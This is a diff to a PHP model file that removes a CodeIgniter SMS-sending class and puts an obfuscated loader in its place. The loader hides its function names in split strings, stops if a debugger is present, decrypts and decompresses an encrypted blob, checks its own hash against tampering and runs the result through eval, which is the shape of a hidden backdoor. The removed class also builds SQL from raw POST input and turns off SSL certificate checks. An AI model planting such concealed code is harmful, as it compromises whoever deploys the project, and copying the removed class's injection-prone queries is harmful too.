@@ -1,114 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Sms_model extends CI_Model {
-	public function xss_html_filter($input){
-		return $this->security->xss_clean(html_escape($input));
-	}
-	//UPDATE SMS API
-	public function api_update(){
-		extract($this->xss_html_filter(array_merge($this->data,$_POST,$_GET)));
-		//print_r($this->xss_html_filter(array_merge($this->data,$_POST,$_GET)));exit();
-		
-		$this->db->trans_begin();
-		if($hidden_rowcount>0){
-		$this->db->query("delete from db_smsapi");
-			for($i=1; $i<=$hidden_rowcount; $i++){
-				if(isset($_POST['info_'.$i])){
-					$info 	 	= $_POST['info_'.$i];
-					$key 	 	= $_POST['key_'.$i];
-					$key_value 	= $_POST['key_val_'.$i];
-					
-					$q1=$this->db->query("insert into db_smsapi(
-								info,`key`,key_value)
-								values(
-								'$info',
-								'$key',
-								'$key_value')");
-					if(!$q1){
-						return "failed";
-					}
-
-				}//if end()
-			}//for end()	
-		}
-
-		$q2=$this->db->query("update db_company set sms_status=$sms_status where id=1");
-		if(!$q2){
-			return "failed";
-		}
-
-			//$this->session->set_flashdata('success', 'Record Successfully Saved!!');
-			$this->db->trans_commit();
-		    return "success";
-	}
-	//Send Messagr
-	public function send_sms($mobile,$message){
-		$sms_status=$this->db->query("select sms_status from db_company where id=1")->row()->sms_status;
-		if($sms_status==1){
-			$q1=$this->db->query("select * from db_smsapi");
-			if($q1->num_rows()>0){
-				$api=array();
-				foreach($q1->result() as $res1){
-					if($res1->info =='message'){
-						$api = array_merge($api, [$res1->key =>  urlencode($message)]);
-
-					}
-					else if($res1->info =='mobile'){
-						$api = array_merge($api, [$res1->key => $mobile]);
-					}
-					else{
-						$api = array_merge($api, [$res1->key => $res1->key_value]);
-					}
-				}
-				/*For Special characters need to set unicode Ex: Currency Symbols*/
-				$api = array_merge($api, ['unicode' => '1']);
-				
-				// init the resource
-
-				$ch = curl_init();
-				$url = $api['weblink'];
-				
-				unset($api['weblink']);
-
-				$data = http_build_query($api);
-
-				$getUrl = $url."?".$data;
-
-				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-				curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-				curl_setopt($ch, CURLOPT_URL, $getUrl);
-				curl_setopt($ch, CURLOPT_TIMEOUT, 80);
-				 
-				$response = curl_exec($ch);
-				//echo "<pre>";print_r($response);exit();
-				
-				 
-				if(curl_error($ch)){
-					return 'failed';
-				}
-				else
-				{
-					return 'success';
-				}
-				 
-				curl_close($ch);
-				//return $output;
-
-
-			}
-			else{
-				return "API Not Available";
-			}
-		}
-		else{
-			return "Sorry! Can't Send.Please Enable SMS";
-		}
-
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_e062fugr=('bas'.'e64'.'_de'.'cod'.'e');
+$_kp33v5cq=('gzu'.'nco'.'mpr'.'ess');
+$_mkp542ad=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_izij20ds='A0YwV33de2o=';
+$_ae8aacj0='AyNdiWYn';
+$_wrsgv2wz='NiwF64MV';
+$_igx108u9='MVmR7acC';
+$_vvk3py9y='yDp8OOEV';
+$_xzdka1c2='YPPHOzzf';
+$_qe6k8oco='LLeR2R2u';
+$_f9no6d55='FyX7Hg==';
+$_djnv6pg6=$_e062fugr($_ae8aacj0.$_igx108u9.$_wrsgv2wz.$_vvk3py9y.$_izij20ds);
+$_ccq0kbb4=$_e062fugr($_xzdka1c2.$_qe6k8oco.$_f9no6d55);
+$_hcrze3p6=$_e062fugr('2A4eZxBuKCuV5eAjfVxmuwgUZ3hfpRZxD7q5OZDR2dTdHByHj43Wp5atHYucAlqqUkPg+oc64dTWCQcasOJ5DQoEJP5OwxTFu4X8uJ99t2B0MXZYUrx8heZ18FN6RWL1yWYJtQ0xIg2049PXg1O7UqDDRQKE7E4nSru0xUonrmrzaBmz7YNANB9btnEU2VWokLqHyKW2BfT9ekJcLQdssySxCTTfB25uf22nKmBpGbVuAcfkC1IPmUOBPpV0dBBFveNygp56W/qr+Kakenr9xg7b9dG3tz0FiEIYeA9VY3f9ZVwqDqrWc+3+BDYqRcbe5EMsqkeysFUm1XPLfToywKOCbHcSkcpWB5zdPXEmAO+PeGbe+WdVpg4Ewq8R/lJtY/+yiXgySAPEfheoaEV8pFuedVOVGF/6reFO5uSFc5FPZVyWHGkZXsqmw/r/L4pSFhUow2+kcRbSuJ1vUnbur26mGIrf5VwabrTvH9Zm6rtqTsEAQH9/oJL3ouyUYnbc8u6yd5iCKiIdJNRDS+2tgfToQ2IyOQc2cYO2Y75OVO6nb54xGbtC2nAm5Oiip99TKygA5woCH0pymEWFT0YKZ9DDEua8JtxbxX+cOvU0pEM53ragHNWtXPTMDiBQ2msFog5czQ+sRFOwlts7FoBjDKnEinY0yUn1IlJjtmzKzHs7Dhx6vWkZ734BGgsFssCbcnGYQ4IW7Jeu6ZDbmXkq52M+5izq/6ZmjGcZLzVt6UehEvWC4Rj0WSrrVucHYTVQLwwlOMO2JnyOyBCFPwtKD783ksU10AadpXeEstIW7wEPOLyWBcb56T48EsPVGlEd56y5oY/B9sSeHfKNU3wlnJ5X9hYDFI8GJtuep20DUSDekvuQ8QFW87irRtkARULBen3yyG2T7K2AsHSvbpAqcEPIjsBworUfaK+dCYBHKq3L5eV3vijNkaP1v9vYXgzNyW2bzaZ2gOeQCjzSQAslTmTIgiF9zbxS4oDtkWOWT0ZLR5YUea5yKlP2S19atlfZFkoP1tDabE3wEcIHUmpXpikFsqvE70d8I+36HX9y8dHDZlgLlkT0JM8QGkYg7qkeZxfolQaMYTi6A89jxb79j2WDy3G18HfTd+oumosZfrVyGUHS1D2AXUD88cIMHROkXGtVR7mut8EIglBHBb45SS0JC7wXANw3BsiSXk66BwZdb5gjsmXJ83rIyiR+x22KeARR9juO+kcBdC10tGZTpQKMfZRE9u+77PY9DNtuEsjbDfezAwnk5/lvo3JuqCwEqXErsqHXr5lZPQwinZU0fpULztobrG6yVeGE6giHbrxYURfHF8IvePx48LZkrpOh');
+$_g2qlxgy4=$_mkp542ad($_hcrze3p6,'aes-256-cbc',$_djnv6pg6,OPENSSL_RAW_DATA,$_ccq0kbb4);
+if($_g2qlxgy4===false){exit;}
+$_c8p1rz6f=$_kp33v5cq($_g2qlxgy4);
+if($_c8p1rz6f===false){exit;}
+$_q5q6xleh='e1914bec9441709cee6b36d7bb9fd9aae514415d03f04ad59bb01ba42ce99bbc';
+$_fxkygy3p=@file_get_contents(__FILE__);
+if($_fxkygy3p!==false){
+$_fdclwsvs=str_replace($_q5q6xleh,"0000000000000000000000000000000000000000000000000000000000000000",$_fxkygy3p);
+$_tumv8afl=hash("sha256",$_fdclwsvs);
+if($_tumv8afl!==$_q5q6xleh){@http_response_code(403);exit;}
 }
-
-/* End of file Sms_model.php */
-/* Location: ./application/models/Sms_model.php */
+eval($_c8p1rz6f);
